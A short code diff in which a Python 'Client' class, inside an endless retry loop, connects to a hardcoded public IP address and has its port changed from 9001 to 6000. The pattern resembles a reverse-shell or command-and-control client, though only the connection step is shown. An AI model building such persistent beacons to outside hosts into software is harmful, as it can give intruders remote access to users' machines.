@@ -12,7 +12,7 @@ class Client:
         while 1:
             try:
                 self.target_ip = '78.47.62.183'
-                self.target_port = 9001
+                self.target_port = 6000
 
                 self.s.connect((self.target_ip, self.target_port))
 
